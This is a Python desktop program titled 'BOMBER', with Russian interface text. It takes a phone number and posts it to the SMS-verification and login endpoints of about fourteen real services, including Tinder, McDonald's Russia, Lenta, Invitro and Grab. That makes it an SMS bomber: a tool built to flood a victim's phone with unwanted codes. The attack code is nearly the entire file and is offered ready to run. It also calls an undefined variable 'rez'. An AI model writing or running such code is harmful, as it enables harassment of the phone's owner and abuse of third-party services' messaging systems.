import requests
import wx

TITLE = 'BOMBER'
ICON_PATH = 'ico.ico'
ID_GOSMS = 1

class MainFrame(wx.Frame):
    def __init__(self,parent,title,size=(250,200),user_login='none'):
        super().__init__(parent,title=title,size=size)
        self.SetBackgroundColour("#ffffff")
        self.SetIcon(wx.Icon(ICON_PATH))

        bSizer4 = wx.BoxSizer(wx.VERTICAL)

        self.m_textCtrl4 = wx.TextCtrl(self, wx.ID_ANY, u"Номер телефона", wx.DefaultPosition, wx.DefaultSize, 0)
        bSizer4.Add(self.m_textCtrl4, 0, wx.ALIGN_CENTER | wx.ALIGN_TOP | wx.ALL, 25)

        # self.m_spinCtrl4 = wx.SpinCtrl(self, wx.ID_ANY, u"5", wx.DefaultPosition, wx.DefaultSize, wx.SP_ARROW_KEYS, 0,
        #                                50, 0)
        # bSizer4.Add(self.m_spinCtrl4, 0, wx.ALIGN_CENTER | wx.ALL, 10)

        self.m_button1 = wx.Button(self, ID_GOSMS, u"Старт", wx.DefaultPosition, wx.DefaultSize, 0)
        bSizer4.Add(self.m_button1, 0, wx.ALIGN_CENTER | wx.ALL, 5)

        self.SetSizer(bSizer4)
        self.Layout()
        self.m_statusBar1 = self.CreateStatusBar(1, wx.STB_SIZEGRIP, wx.ID_ANY)
        self.m_statusBar1.SetStatusText('with love from ra.by')
        self.m_statusBar1.Centre()

        self.Bind(wx.EVT_BUTTON,self.GoSms,id=ID_GOSMS)

    def GoSms(self,event):
        num = self.m_textCtrl4.GetLineText(0)
        # count = self.m_spinCtrl4.GetValue()  # сейчас никак не обрабатывается
        count = 1
        if not num:
            self.m_statusBar1.SetStatusText('Номер не может быть пустым!')
        else:
            if count>0:
                self.m_statusBar1.SetStatusText('В работе...')
                self.Sms(num=num,count=count)
            else: self.m_statusBar1.SetStatusText('Кол-во < 0 ')

    def Sms(self,num,count):
        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': num}, headers={})
            requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': num})
            requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': num})
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': num})
            requests.post('https://online.sbis.ru/reg/service/',
                          json={'jsonrpc': '2.0', 'protocol': '5', 'method': 'Пользователь.ЗаявкаНаФизика',
                                'params': {'phone': num}, 'id': '1'})
            requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + num})
            requests.post('https://mcdonalds.ru/api/auth/code', json={'phone': '+' + num})
            requests.post('https://www.citilink.ru/registration/confirm/phone/+' + num + '/')
            requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + num})
            requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': num})
            requests.post('https://www.rabota.ru/remind', data={'credential': num})
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': num}, headers={})
            requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': num}, headers={})
            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
                          data={'phoneNumber': num, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
                                'deviceToken': '*'}, headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        except:
            print(':(')
        print(rez)
        self.m_statusBar1.SetStatusText('Работу окончил.')


app = wx.App()

f = MainFrame(None,title=TITLE)
f.Center()
f.Show()

app.MainLoop()